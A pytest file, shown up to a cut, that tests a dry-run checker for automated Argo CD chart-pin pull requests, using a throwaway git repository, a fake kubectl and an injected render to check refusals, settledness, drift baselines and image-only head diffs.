"""`scripts/pin_dryrun.py`, E2-interim of the automatic pin (ledger 1632 C4, ADR-0946, ADR-0948 R2).

No cluster, no helm and no network. The data lives in a throwaway git
repository built here (main, plus one branch per case). The render is injected:
`render.yaml` stands in for the parent render at the current pin. The cluster
is `verify_handover.Cluster` over a fake kubectl runner answering from
`live.json`; an argv the fake does not hold answers as a kubectl failure.
GitHub is a fake object; a path it does not hold answers 404.

WHAT IS ASSERTED, each with a red case:

  1. Refusals come BEFORE any cluster read: a sha whose `main...sha` diff
     touches a file outside the three pin files (a rename shows both paths), a
     `yadgar.yaml` that differs from main's in anything but the one
     `targetRevision` line (the live red proof's shape: an env entry added to
     values), a `chart_pin.json` that differs in anything but `chart_tag` and
     a well-formed `chart_digest`, a
     target that is not a release, a render table that disagrees with the head
     render, a rendered Secret, and a kind the read table does not name.
  2. Settledness: `yadgar` Synced, Healthy, no operation running, at main's
     pin in `spec.source.targetRevision` and `status.sync.revision`.
  3. The baseline: main's render is a subset of live, hooks left out, Argo's
     tracking-id naming `yadgar` and the object. Quantities are normalised at
     resource-quantity paths only. Lists compare by index and length.
  4. The head diff: only `containers[*].image` of a Deployment, StatefulSet or
     Job; anything else is red, initContainers included. The object set is the
     same at both pins.
  5. The result holds object keys and field paths, never a value; every kubectl
     call is `get ... -o json` with the context; a kubectl failure is
     infrastructure (exit 3, nothing written).
  6. `find` (the reader `auto-pin.yaml` uses, car C5) takes evidence only from a
     completed `workflow_dispatch` run of the workflow's path, on the default
     branch with a head_sha reachable from it, in this repository as head; the
     artifact's own `sha` must be the one asked for; the newest wins.
  7. The module imports without PyYAML, so the reader runs in a job that
     installs nothing.
"""

from __future__ import annotations

import copy
import datetime as dt
import io
import hashlib
import json
import os
import subprocess
import sys
import zipfile
from pathlib import Path

import pytest
import yaml

SCRIPTS = Path(__file__).resolve().parents[1]
FIXTURES = Path(__file__).resolve().parent / "fixtures" / "pin_dryrun"
if str(SCRIPTS) not in sys.path:
    sys.path.insert(0, str(SCRIPTS))

import pin_dryrun  # noqa: E402
import verify_handover  # noqa: E402

CONTEXT = "in-cluster-verifier"
PIN = "0.25.27"
TARGET = "0.25.28"
NEW_GATEWAY = "ghcr.io/yadgarhq/gateway:0.12.14@sha256:" + "e" * 64

APPLICATION = """\
# The parent Application. Comments survive the pin edit.
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: yadgar
  namespace: argocd
spec:
  project: default
  source:
    repoURL: ghcr.io/yadgarhq/charts
    chart: yadgar
    # EDIT THIS. targetRevision is the line an upgrade moves.
    targetRevision: {pin}
    helm:
      valuesObject:
        gateway:
          env:
            LOG_LEVEL: info
  destination:
    server: https://kubernetes.default.svc
    namespace: yadgar
"""

CHART_PIN = '{{\n  "chart_tag": "v{pin}",\n  "chart_digest": "{digest}",\n  "platform_version": "0.2.6"\n}}\n'


def chart_pin(pin: str, digest: str | None = None) -> str:
    """`chart_pin.json` at `pin`; each pin records its own digest, as a real bump moves both (yaadgaar 250)."""
    return CHART_PIN.format(pin=pin, digest=digest if digest is not None else "sha256:" + hashlib.sha256(pin.encode()).hexdigest())


# ── the injected render ─────────────────────────────────────────────────────


def base_documents() -> list:
    return [d for d in yaml.safe_load_all((FIXTURES / "render.yaml").read_text()) if d]


def by_kind_name(documents: list, kind: str, name: str) -> dict:
    return next(d for d in documents if d["kind"] == kind and d["metadata"]["name"] == name)


def head_documents() -> list:
    documents = base_documents()
    gateway = by_kind_name(documents, "Deployment", "gateway")
    gateway["spec"]["template"]["spec"]["containers"][0]["image"] = NEW_GATEWAY
    return documents


class Render:
    """`{version: documents}`; records each version rendered."""

    def __init__(self, versions: dict | None = None) -> None:
        self.versions = versions or {PIN: base_documents(), TARGET: head_documents()}
        self.calls: list[str] = []

    def __call__(self, application: bytes) -> list:
        version = str(yaml.safe_load(application)["spec"]["source"]["targetRevision"])
        self.calls.append(version)
        return copy.deepcopy(self.versions[version])


def table_for(documents: list, version: str) -> str:
    digests = pin_dryrun.gate_digests()(documents)
    lines = ["# K3 fixture", f"targetRevision  {version}"]
    lines += [f"{digest}  {key}" for key, digest in sorted(digests.items())]
    return "\n".join(lines) + "\n"


# ── the throwaway repository ────────────────────────────────────────────────


def git(repo: Path, *args: str) -> str:
    # A pre-commit hook exports GIT_DIR, which overrides `-C`. An empty global
    # config keeps this throwaway repository free of the host's signing setup.
    env = {k: v for k, v in os.environ.items() if not k.startswith("GIT_")}
    env.update(GIT_CONFIG_GLOBAL=os.devnull, GIT_CONFIG_NOSYSTEM="1")
    command = ["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@example.org", *args]
    return subprocess.run(command, capture_output=True, text=True, check=True, env=env).stdout.strip()


def write(repo: Path, path: str, text: str) -> None:
    target = repo / path
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(text)


def commit(repo: Path, message: str) -> str:
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", message)
    return git(repo, "rev-parse", "HEAD")


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    root = tmp_path / "argocd"
    root.mkdir()
    git(root, "init", "-q", "-b", "main")
    write(root, "applications/yadgar.yaml", APPLICATION.format(pin=PIN))
    write(root, "scripts/chart_pin.json", chart_pin(PIN))
    write(root, "scripts/gates/yadgar_render.sha256", table_for(base_documents(), PIN))
    write(root, ".github/workflows/ci.yaml", "name: ci\n")
    write(root, "README.md", "argocd\n")
    # THE CHECKER AT MAIN: the very files this test imports, so `dry_run`
    # finds the code it runs is main's (it refuses otherwise).
    for path in pin_dryrun.CHECKER_FILES:
        target = root / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes((SCRIPTS.parent / path).read_bytes())
    commit(root, "main")
    return root


def main_sha(repo: Path) -> str:
    return git(repo, "rev-parse", "main")


def pin_branch(repo: Path, name: str = "auto/pin-0.25.28", *, target: str = TARGET, table_docs: list | None = None, extra=None) -> str:
    git(repo, "checkout", "-q", "-b", name, "main")
    write(repo, "applications/yadgar.yaml", APPLICATION.format(pin=target))
    write(repo, "scripts/chart_pin.json", chart_pin(target))
    write(repo, "scripts/gates/yadgar_render.sha256", table_for(table_docs if table_docs is not None else head_documents(), target))
    if extra:
        extra(repo)
    sha = commit(repo, f"pin {target}")
    git(repo, "checkout", "-q", "main")
    return sha


# ── the fake cluster ────────────────────────────────────────────────────────


def live_objects() -> dict:
    return json.loads((FIXTURES / "live.json").read_text())


class Kubectl:
    """A kubectl runner answering from `live.json`. Records every argv."""

    def __init__(self, live: dict | None = None) -> None:
        self.live = live if live is not None else live_objects()
        self.calls: list[list[str]] = []

    def __call__(self, cmd, capture_output, text, check):
        self.calls.append(list(cmd))
        assert cmd[:3] == ["kubectl", "--context", CONTEXT], cmd
        args = cmd[3:]
        assert args[0] == "get" and args[-2:] == ["-o", "json"], args
        key = " ".join(args[1:-2])
        if key not in self.live:
            return subprocess.CompletedProcess(cmd, 1, "", f"error: the fake holds no {key!r}")
        return subprocess.CompletedProcess(cmd, 0, json.dumps(self.live[key]), "")


class NoCluster:
    """A runner that fails the test if anything reads the cluster."""

    def __call__(self, cmd, **_):
        raise AssertionError(f"the cluster was read before the refusal: {cmd}")


def run(repo: Path, sha: str, *, kubectl=None, render: Render | None = None, base: str | None = None, platform_of=None) -> dict:
    """The dry run; the target chart's `platform` is the pinned one unless `platform_of` says otherwise (car C10)."""
    cluster = verify_handover.Cluster(CONTEXT, runner=kubectl if kubectl is not None else Kubectl())
    platform_of = platform_of or (lambda target: "0.2.6")
    return pin_dryrun.dry_run(repo, base or main_sha(repo), sha, cluster, render=render or Render(), platform_of=platform_of)


def items(live: dict, key: str) -> list:
    return live[key]["items"]


# ── 1. refusals, before any cluster read ────────────────────────────────────


def test_the_clean_image_only_pin_is_green_and_names_the_one_path(repo: Path) -> None:
    result = run(repo, pin_branch(repo))
    assert result["result"] == "green", result["problems"]
    assert result["objects"] == [{"key": "apps/Deployment//gateway", "paths": ["spec.template.spec.containers[0].image"]}]
    assert result["target"] == TARGET and result["pin"] == PIN
    assert result["interim"] is True
    assert "admission webhooks" in " ".join(result["not_run"])


def test_a_sha_whose_diff_touches_ci_yaml_is_refused_before_any_cluster_read(repo: Path) -> None:
    sha = pin_branch(repo, extra=lambda r: write(r, ".github/workflows/ci.yaml", "name: ci\non: push\n"))
    result = run(repo, sha, kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any(".github/workflows/ci.yaml" in p for p in result["problems"]), result["problems"]


def test_a_rename_shows_the_old_path_and_is_refused(repo: Path) -> None:
    def rename(r: Path) -> None:
        git(r, "mv", ".github/workflows/ci.yaml", "scripts/gates/ci.yaml")

    result = run(repo, pin_branch(repo, extra=rename), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any(".github/workflows/ci.yaml" in p for p in result["problems"]), result["problems"]


ACK = "scripts/pin_needs_human_ack.json"


def ack_entry(target: str = TARGET, why: str = "checked each reason") -> dict:
    return {"target": target, "reasons": ["gateway: a reason"], "why": why}


def ack_text(entries) -> str:
    return json.dumps(entries, indent=2) + "\n"


def with_base_acks(repo: Path, entries: list) -> None:
    """Main already carries an acknowledgement file (an earlier pin's)."""
    write(repo, ACK, ack_text(entries))
    commit(repo, "main with acks")


def ack_branch(repo: Path, head_text: str) -> str:
    return pin_branch(repo, extra=lambda r: write(r, ACK, head_text))


def test_pin_files_plus_one_appended_ack_entry_pass_step_one(repo: Path) -> None:
    old = ack_entry("0.25.20")
    with_base_acks(repo, [old])
    result = run(repo, ack_branch(repo, ack_text([old, ack_entry()])))
    assert result["result"] == "green", result["problems"]


def test_the_first_ack_file_added_to_a_base_without_one_passes(repo: Path) -> None:
    result = run(repo, ack_branch(repo, ack_text([ack_entry()])))
    assert result["result"] == "green", result["problems"]


def test_editing_an_existing_ack_entry_is_refused(repo: Path) -> None:
    old = ack_entry("0.25.20")
    with_base_acks(repo, [old])
    result = run(repo, ack_branch(repo, ack_text([{**old, "why": "rewritten"}, ack_entry()])), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any(ACK in p and "append-only" in p for p in result["problems"]), result["problems"]


def test_deleting_an_ack_entry_is_refused(repo: Path) -> None:
    olds = [ack_entry("0.25.20"), ack_entry("0.25.21")]
    with_base_acks(repo, olds)
    result = run(repo, ack_branch(repo, ack_text([olds[0], ack_entry()])), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any(ACK in p and "append-only" in p for p in result["problems"]), result["problems"]


def test_reordering_ack_entries_is_refused(repo: Path) -> None:
    olds = [ack_entry("0.25.20"), ack_entry("0.25.21")]
    with_base_acks(repo, olds)
    result = run(repo, ack_branch(repo, ack_text([olds[1], olds[0], ack_entry()])), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any(ACK in p and "append-only" in p for p in result["problems"]), result["problems"]


def test_an_appended_ack_entry_for_another_target_is_refused(repo: Path) -> None:
    result = run(repo, ack_branch(repo, ack_text([ack_entry("0.99.0")])), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any(ACK in p and "0.99.0" in p for p in result["problems"]), result["problems"]


def test_an_ack_file_that_drops_an_entry_and_adds_none_is_refused(repo: Path) -> None:
    old = ack_entry("0.25.20")
    with_base_acks(repo, [old, ack_entry("0.25.21")])
    result = run(repo, ack_branch(repo, ack_text([old])), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any(ACK in p and "not an unchanged prefix" in p for p in result["problems"]), result["problems"]


def test_a_reformat_of_the_ack_file_that_appends_nothing_is_refused(repo: Path) -> None:
    old = ack_entry("0.25.20")
    with_base_acks(repo, [old])
    result = run(repo, ack_branch(repo, json.dumps([old]) + "\n"), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any(ACK in p and "no entry appended" in p for p in result["problems"]), result["problems"]


@pytest.mark.parametrize(
    ("bad", "text"),
    [
        ("{not json", "not JSON"),
        ('{"target": "0.25.28"}', "must be a JSON list"),
        ('[{"target": "0.25.28"}]', "needs a non-empty"),
        ("[1]", "needs a non-empty"),
        ('[{"target": "0.25.28", "reasons": [1], "why": "w"}]', "strings and reasons a list of strings"),
        ('[{"target": "0.25.28", "reasons": ["r"], "why": "w", "why": "other"}]', "duplicate key"),
    ],
)
def test_a_malformed_ack_file_is_refused(repo: Path, bad: str, text: str) -> None:
    result = run(repo, ack_branch(repo, bad + "\n"), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any(ACK in p and text in p for p in result["problems"]), result["problems"]


def test_a_duplicate_key_in_the_base_ack_file_is_refused(repo: Path) -> None:
    write(repo, ACK, '[{"target": "0.25.20", "reasons": ["r"], "why": "w", "why": "other"}]\n')
    commit(repo, "main with a duplicate key")
    result = run(repo, ack_branch(repo, ack_text([ack_entry()])), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any(ACK in p and "duplicate key" in p for p in result["problems"]), result["problems"]


def test_a_malformed_base_ack_file_is_refused(repo: Path) -> None:
    write(repo, ACK, "{not json\n")
    commit(repo, "main with a broken ack file")
    result = run(repo, ack_branch(repo, ack_text([ack_entry()])), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any(ACK in p and "not JSON" in p for p in result["problems"]), result["problems"]


def test_a_base_ack_file_of_valid_json_and_invalid_schema_is_refused(repo: Path) -> None:
    """Main's own copy goes through the schema validator too: a bare-JSON `[1]` base would otherwise pass as a prefix."""
    write(repo, ACK, "[1]\n")
    commit(repo, "main with a schema-invalid ack file")
    result = run(repo, ack_branch(repo, ack_text([ack_entry()])), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any(ACK in p and "needs a non-empty" in p for p in result["problems"]), result["problems"]


def test_a_deleted_ack_file_is_refused(repo: Path) -> None:
    with_base_acks(repo, [ack_entry("0.25.20")])
    result = run(repo, pin_branch(repo, extra=lambda r: (r / ACK).unlink()), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any(ACK in p and "deleted by the sha" in p for p in result["problems"]), result["problems"]


def test_the_checker_files_hold_the_pin_evidence_and_auto_pin_code() -> None:
    """`run` executes both; a checker identity that leaves them out would not notice a stale copy."""
    assert {"scripts/pin_evidence.py", "scripts/auto_pin.py"} <= set(pin_dryrun.CHECKER_FILES)


def test_the_outside_file_refusal_names_the_ack_allowance(repo: Path) -> None:
    result = run(repo, pin_branch(repo, extra=lambda r: write(r, "README.md", "changed\n")), kubectl=NoCluster())
    assert any("README.md" in p and ACK in p and "append" in p for p in result["problems"]), result["problems"]


SEED_ALLOWLIST = "scripts/gates/migration_seed_allowlist.json"


@pytest.mark.parametrize("main_has_it", [False, True], ids=["added-by-the-pin", "edited-by-the-pin"])
def test_pin_dryrun_refuses_a_pin_pr_that_edits_the_seed_allowlist(repo: Path, main_has_it: bool) -> None:
    """ADR-1099: the seed allowlist is read from main only, and a pin PR that touches it is refused at step 1, before
    any cluster read: it is none of the pin files, operator Applications or the append-only ack file."""
    if main_has_it:
        write(repo, SEED_ALLOWLIST, "[]\n")
        commit(repo, "main ships the empty seed allowlist")
    entry = '[{"module": "iam-db", "table": "t", "columns": ["id"], "reason": "r", "adr": "ADR-1099"}]\n'
    result = run(repo, pin_branch(repo, extra=lambda r: write(r, SEED_ALLOWLIST, entry)), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any(p.startswith(f"{SEED_ALLOWLIST}: changed by main...") for p in result["problems"]), result["problems"]


def test_an_ack_entry_beside_another_extra_file_still_refuses_the_extra_file(repo: Path) -> None:
    def both(r: Path) -> None:
        write(r, ACK, ack_text([ack_entry()]))
        write(r, "README.md", "changed\n")

    result = run(repo, pin_branch(repo, extra=both), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any("README.md" in p for p in result["problems"]), result["problems"]


def test_a_values_change_beside_the_pin_is_refused_before_any_cluster_read(repo: Path) -> None:
    # THE LIVE RED PROOF'S SHAPE: an env entry added to a module's values.
    def add_env(r: Path) -> None:
        text = (r / "applications/yadgar.yaml").read_text()
        write(r, "applications/yadgar.yaml", text.replace("LOG_LEVEL: info\n", "LOG_LEVEL: info\n            NEW_KEY: x\n"))

    result = run(repo, pin_branch(repo, extra=add_env), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any("applications/yadgar.yaml" in p and "targetRevision" in p for p in result["problems"]), result["problems"]


def test_an_env_change_without_a_pin_move_is_refused_too(repo: Path) -> None:
    git(repo, "checkout", "-q", "-b", "scratch/env", "main")
    text = (repo / "applications/yadgar.yaml").read_text()
    write(repo, "applications/yadgar.yaml", text.replace("LOG_LEVEL: info\n", "LOG_LEVEL: info\n            NEW_KEY: x\n"))
    sha = commit(repo, "scratch")
    git(repo, "checkout", "-q", "main")
    result = run(repo, sha, kubectl=NoCluster())
    assert result["result"] == "refused"


def test_a_chart_pin_change_beyond_chart_tag_is_refused(repo: Path) -> None:
    def platform(r: Path) -> None:
        write(r, "scripts/chart_pin.json", chart_pin(TARGET).replace("0.2.6", "0.2.7"))

    result = run(repo, pin_branch(repo, extra=platform), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any("scripts/chart_pin.json" in p for p in result["problems"]), result["problems"]


@pytest.mark.parametrize("target", ["0.26.0-rc.1", "v0.25.28", "latest"])
def test_a_target_that_is_not_a_release_is_refused(repo: Path, target: str) -> None:
    result = run(repo, pin_branch(repo, target=target, table_docs=base_documents()), kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any("release" in p for p in result["problems"]), result["problems"]


def test_a_render_table_that_disagrees_with_the_head_render_is_refused(repo: Path) -> None:
    sha = pin_branch(repo, table_docs=base_documents())
    result = run(repo, sha, kubectl=NoCluster())
    assert result["result"] == "refused"
    assert any("yadgar_render.sha256" in p and "apps/Deployment//gateway" in p for p in result["problems"]), result["problems"]


def test_a_rendered_secret_is_refused_and_never_read(repo: Path) -> None:
    secret = {"apiVersion": "v1", "kind": "Secret", "metadata": {"name": "leak"}, "stringData": {"k": "v"}}
    render = Render({PIN: base_documents() + [secret], TARGET: head_documents() + [secret]})
    sha = pin_branch(repo, table_docs=head_documents() + [secret])
    result = run(repo, sha, kubectl=NoCluster(), render=render)
    assert result["result"] == "refused"
    assert any("/Secret//leak" in p for p in result["problems"]), result["problems"]


def test_a_kind_the_read_table_does_not_name_is_refused(repo: Path) -> None:
    odd = {"apiVersion": "example.org/v1", "kind": "Widget", "metadata": {"name": "w"}}
    render = Render({PIN: base_documents() + [odd], TARGET: head_documents() + [odd]})
    sha = pin_branch(repo, table_docs=head_documents() + [odd])
    result = run(repo, sha, kubectl=NoCluster(), render=render)
    assert result["result"] == "refused"
    assert any("example.org/Widget//w" in p for p in result["problems"]), result["problems"]


def test_a_hook_of_a_kind_outside_the_read_table_is_left_out_not_refused(repo: Path) -> None:
    # Measured at 0.25.27: the Roles and RoleBindings are `helm.sh/hook` objects only.
    hook = {
        "apiVersion": "rbac.authorization.k8s.io/v1",
        "kind": "Role",
        "metadata": {"name": "preflight", "annotations": {"helm.sh/hook": "pre-install"}},
        "rules": [],
    }
    render = Render({PIN: base_documents() + [hook], TARGET: head_documents() + [hook]})
    sha = pin_branch(repo, table_docs=head_documents() + [hook])
    result = run(repo, sha, render=render)
    assert result["result"] == "green", result["problems"]
    assert "rbac.authorization.k8s.io/Role//preflight" in result["hooks_left_out"]


def test_an_object_added_at_head_is_red(repo: Path) -> None:
    # The #104 seeder shape: the object set moves.
    extra = {"apiVersion": "v1", "kind": "ConfigMap", "metadata": {"name": "new-one"}, "data": {}}
    render = Render({PIN: base_documents(), TARGET: head_documents() + [extra]})
    sha = pin_branch(repo, table_docs=head_documents() + [extra])
    result = run(repo, sha, render=render)
    assert result["result"] == "red"
    assert any("/ConfigMap//new-one" in p and "added" in p for p in result["problems"]), result["problems"]


def test_a_steady_object_removed_at_head_is_red(repo: Path) -> None:
    # Re-review F1: a chart that drops a steady object (the ConfigMap here, a
    # NetworkPolicy in life) leaves it live, so only the object-set rule sees it.
    head = [d for d in head_documents() if not (d["kind"] == "ConfigMap" and d["metadata"]["name"] == "shared")]
    sha = pin_branch(repo, table_docs=head)
    result = run(repo, sha, render=Render({PIN: base_documents(), TARGET: head}))
    assert result["result"] == "red"
    assert any("/ConfigMap//shared" in p and "removed at head" in p for p in result["problems"]), result["problems"]


def test_a_key_rendered_twice_is_refused_not_a_traceback(repo: Path, tmp_path: Path) -> None:
    # Re-review F9: `digests` asserts on a key rendered twice; that must not escape as exit 1.
    twice = head_documents() + [by_kind_name(head_documents(), "ConfigMap", "shared")]
    sha = pin_branch(repo, table_docs=head_documents())
    result = run(repo, sha, kubectl=NoCluster(), render=Render({PIN: base_documents(), TARGET: twice}))
    assert result["result"] == "refused"
    assert any("/ConfigMap//shared" in p and "rendered twice" in p for p in result["problems"]), result["problems"]
    out = tmp_path / "out" / "result.json"
    argv = ["run", "--repo", str(repo), "--main-sha", main_sha(repo), "--sha", sha, "--context", CONTEXT, "--out", str(out)]
    assert pin_dryrun.main(argv, render=Render({PIN: base_documents(), TARGET: twice}), kube_runner=NoCluster()) == 1
    assert json.loads(out.read_text())["result"] == "refused"


# ── 2. settledness ──────────────────────────────────────────────────────────


def test_an_operation_running_is_red_not_settled(repo: Path) -> None:
    live = live_objects()
    live["applications.argoproj.io yadgar -n argocd"]["status"]["operationState"]["phase"] = "Running"
    result = run(repo, pin_branch(repo), kubectl=Kubectl(live))
    assert result["result"] == "red"
    assert any("not settled" in p and "Running" in p for p in result["problems"]), result["problems"]


def test_a_pending_operation_is_not_settled(repo: Path) -> None:
    live = live_objects()
    live["applications.argoproj.io yadgar -n argocd"]["operation"] = {"sync": {"revision": PIN}}
    result = run(repo, pin_branch(repo), kubectl=Kubectl(live))
    assert result["result"] == "red"
    assert any("not settled" in p for p in result["problems"]), result["problems"]


@pytest.mark.parametrize(
    ("field", "value"),
    [(("status", "sync", "status"), "OutOfSync"), (("status", "health", "status"), "Degraded")],
)
def test_out_of_sync_or_degraded_is_not_settled(repo: Path, field: tuple, value: str) -> None:
    live = live_objects()
    node = live["applications.argoproj.io yadgar -n argocd"]
    for part in field[:-1]:
        node = node[part]
    node[field[-1]] = value
    result = run(repo, pin_branch(repo), kubectl=Kubectl(live))
    assert result["result"] == "red"
    assert any("not settled" in p and value in p for p in result["problems"]), result["problems"]


def test_an_application_not_yet_at_mains_pin_is_not_settled_rather_than_drift(repo: Path) -> None:
    live = live_objects()
    application = live["applications.argoproj.io yadgar -n argocd"]
    application["spec"]["source"]["targetRevision"] = "0.25.14"
    application["status"]["sync"]["revision"] = "0.25.14"
    result = run(repo, pin_branch(repo), kubectl=Kubectl(live))
    assert result["result"] == "red"
    assert any("not settled" in p and "0.25.14" in p for p in result["problems"]), result["problems"]


# ── 3. the baseline ─────────────────────────────────────────────────────────


def test_live_drift_is_red_baseline_not_empty(repo: Path) -> None:
    live = live_objects()
    items(live, "statefulsets.apps -n yadgar")[0]["spec"]["replicas"] = 3
    result = run(repo, pin_branch(repo), kubectl=Kubectl(live))
    assert result["result"] == "red"
    assert any("baseline not empty" in p and "apps/StatefulSet//nats" in p and "spec.replicas" in p for p in result["problems"])


def test_normalised_quantities_are_no_diff(repo: Path) -> None:
    # Live `cpu: 1` against rendered `1000m`, live `memory: 1Gi` against `1024Mi`.
    live = live_objects()
    resources = items(live, "deployments.apps -n yadgar")[0]["spec"]["template"]["spec"]["containers"][0]["resources"]
    assert resources == {"requests": {"cpu": "1", "memory": "1Gi"}, "limits": {"memory": "1Gi"}}
    rendered = by_kind_name(base_documents(), "Deployment", "gateway")["spec"]["template"]["spec"]["containers"][0]
    assert rendered["resources"]["requests"] == {"cpu": "1000m", "memory": "1024Mi"}
    result = run(repo, pin_branch(repo), kubectl=Kubectl(live))
    assert result["result"] == "green", result["problems"]
    assert result["baseline"] == []


def test_a_real_quantity_change_is_still_a_diff(repo: Path) -> None:
    live = live_objects()
    items(live, "deployments.apps -n yadgar")[0]["spec"]["template"]["spec"]["containers"][0]["resources"]["requests"]["cpu"] = "500m"
    result = run(repo, pin_branch(repo), kubectl=Kubectl(live))
    assert result["result"] == "red"
    assert any("resources.requests.cpu" in p for p in result["problems"]), result["problems"]


def test_a_quantity_looking_string_outside_resources_is_not_normalised(repo: Path) -> None:
    live = live_objects()
    items(live, "configmaps -n yadgar")[0]["data"]["CPU_HINT"] = "1"
    result = run(repo, pin_branch(repo), kubectl=Kubectl(live))
    assert result["result"] == "red"
    assert any("/ConfigMap//shared" in p and "data.CPU_HINT" in p for p in result["problems"]), result["problems"]


def _with_empty_env_value(documents: list) -> list:
    container = by_kind_name(documents, "Deployment", "gateway")["spec"]["template"]["spec"]["containers"][0]
    container["env"].append({"name": "EMPTY_ON_PURPOSE", "value": ""})
    return documents


def test_an_empty_env_value_matches_the_absent_field_the_server_keeps(repo: Path) -> None:
    # MEASURED IN THE 0.25.27 RENDER: gateway env[43] and env[44] carry
    # `value: ""`. EnvVar.value is `omitempty`, so the API server drops it.
    render = Render({PIN: _with_empty_env_value(base_documents()), TARGET: _with_empty_env_value(head_documents())})
    live = live_objects()
    items(live, "deployments.apps -n yadgar")[0]["spec"]["template"]["spec"]["containers"][0]["env"].append({"name": "EMPTY_ON_PURPOSE"})
    sha = pin_branch(repo, table_docs=_with_empty_env_value(head_documents()))
    result = run(repo, sha, kubectl=Kubectl(live), render=render)
    assert result["result"] == "green", result["problems"]


def test_an_empty_env_value_against_a_live_value_is_drift(repo: Path) -> None:
    render = Render({PIN: _with_empty_env_value(base_documents()), TARGET: _with_empty_env_value(head_documents())})
    live = live_objects()
    env = items(live, "deployments.apps -n yadgar")[0]["spec"]["template"]["spec"]["containers"][0]["env"]
    env.append({"name": "EMPTY_ON_PURPOSE", "value": "set-by-hand"})
    sha = pin_branch(repo, table_docs=_with_empty_env_value(head_documents()))
    result = run(repo, sha, kubectl=Kubectl(live), render=render)
    assert result["result"] == "red"
    assert any("containers[0].env[1].value" in p for p in result["problems"]), result["problems"]


def test_a_false_pointer_field_absent_live_is_drift(repo: Path) -> None:
    # `automountServiceAccountToken: false` absent live means the default true.
    documents = [base_documents(), head_documents()]
    for docs in documents:
        by_kind_name(docs, "ServiceAccount", "gateway")["automountServiceAccountToken"] = False
    sha = pin_branch(repo, table_docs=documents[1])
    result = run(repo, sha, render=Render({PIN: documents[0], TARGET: documents[1]}))
    assert result["result"] == "red"
    assert any("/ServiceAccount//gateway automountServiceAccountToken" in p for p in result["problems"]), result["problems"]


def test_an_object_missing_live_is_red(repo: Path) -> None:
    live = live_objects()
    live["serviceaccounts -n yadgar"]["items"] = []
    result = run(repo, pin_branch(repo), kubectl=Kubectl(live))
    assert result["result"] == "red"
    assert any("/ServiceAccount//gateway" in p and "not live" in p for p in result["problems"]), result["problems"]


def test_hook_objects_are_left_out(repo: Path) -> None:
    # `Job/preflight` carries `helm.sh/hook` and is not live; it is not compared.
    result = run(repo, pin_branch(repo))
    assert result["result"] == "green", result["problems"]
    assert result["hooks_left_out"] == ["batch/Job//preflight"]
    assert result["compared"] == 7


def test_a_live_list_longer_than_the_render_is_drift(repo: Path) -> None:
    live = live_objects()
    containers = items(live, "deployments.apps -n yadgar")[0]["spec"]["template"]["spec"]["containers"]
    containers.append({"name": "sidecar", "image": "example.org/sidecar:1"})
    result = run(repo, pin_branch(repo), kubectl=Kubectl(live))
    assert result["result"] == "red"
    assert any("apps/Deployment//gateway" in p and "spec.template.spec.containers" in p for p in result["problems"])


def test_a_tracking_id_naming_another_application_is_drift(repo: Path) -> None:
    live = live_objects()
    items(live, "configmaps -n yadgar")[0]["metadata"]["annotations"][pin_dryrun.TRACKING_ID] = "root:/ConfigMap:yadgar/shared"
    result = run(repo, pin_branch(repo), kubectl=Kubectl(live))
    assert result["result"] == "red"
    assert any("/ConfigMap//shared" in p and "tracking-id" in p for p in result["problems"]), result["problems"]


def test_a_cluster_scoped_object_is_read_without_a_namespace(repo: Path) -> None:
    kubectl = Kubectl()
    run(repo, pin_branch(repo), kubectl=kubectl)
    gatewayclasses = [c for c in kubectl.calls if c[4] == "gatewayclasses.gateway.networking.k8s.io"]
    assert gatewayclasses and all("-n" not in c for c in gatewayclasses)


# ── 4. the head diff ────────────────────────────────────────────────────────


def test_a_head_diff_that_touches_a_configmap_is_red(repo: Path) -> None:
    head = head_documents()
    by_kind_name(head, "ConfigMap", "shared")["data"]["LOG_LEVEL"] = "debug"
    sha = pin_branch(repo, table_docs=head)
    result = run(repo, sha, render=Render({PIN: base_documents(), TARGET: head}))
    assert result["result"] == "red"
    assert any("/ConfigMap//shared" in p and "data.LOG_LEVEL" in p for p in result["problems"]), result["problems"]
    assert {"key": "/ConfigMap//shared", "paths": ["data.LOG_LEVEL"]} in result["objects"]


def test_an_init_container_image_change_is_red(repo: Path) -> None:
    head = head_documents()
    init = by_kind_name(head, "Deployment", "gateway")["spec"]["template"]["spec"]["initContainers"][0]
    init["image"] = "ghcr.io/yadgarhq/wait:0.1.1@sha256:" + "2" * 64
    sha = pin_branch(repo, table_docs=head)
    result = run(repo, sha, render=Render({PIN: base_documents(), TARGET: head}))
    assert result["result"] == "red"
    assert any("initContainers[0].image" in p for p in result["problems"]), result["problems"]


def test_an_env_entry_added_at_head_is_red(repo: Path) -> None:
    head = head_documents()
    container = by_kind_name(head, "Deployment", "gateway")["spec"]["template"]["spec"]["containers"][0]
    container["env"].append({"name": "NEW_KEY", "value": "x"})
    sha = pin_branch(repo, table_docs=head)
    result = run(repo, sha, render=Render({PIN: base_documents(), TARGET: head}))
    assert result["result"] == "red"
    assert any("containers[0].env" in p for p in result["problems"]), result["problems"]


def test_a_target_equal_to_the_pin_has_an_empty_head_diff(repo: Path) -> None:
    git(repo, "checkout", "-q", "-b", "auto/pin-same", "main")
    write(repo, "README.md", "argocd\n")  # nothing changes; an empty commit
    git(repo, "commit", "-q", "--allow-empty", "-m", "same")
